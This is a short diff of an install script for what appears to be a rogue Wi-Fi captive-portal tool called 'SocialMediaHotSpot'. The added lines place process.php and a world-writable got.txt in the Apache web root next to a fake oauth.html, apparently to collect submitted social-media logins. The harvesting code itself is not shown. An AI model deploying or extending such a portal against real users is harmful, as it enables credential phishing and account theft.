@@ -10,6 +10,9 @@ mv /root/SocialMediaHotSpot/hotspot-detect.html /var/www/html/hotspot-detect.htm
 mv /root/SocialMediaHotSpot/redirect /var/www/html/redirect
 mv /root/SocialMediaHotSpot/static* /var/www/html/
 mv /root/SocialMediaHotSpot/oauth.html /var/www/html/oauth.html
+mv /root/SocialMediaHotSpot/process.php /var/www/html/process.php
+mv /root/SocialMediaHotSpot/got.txt /var/www/html/got.txt
+chmod a+w /var/www/html/got.txt
 a2enmod php7.2
 systemctl restart apache2
 /etc/init.d/apache2 start
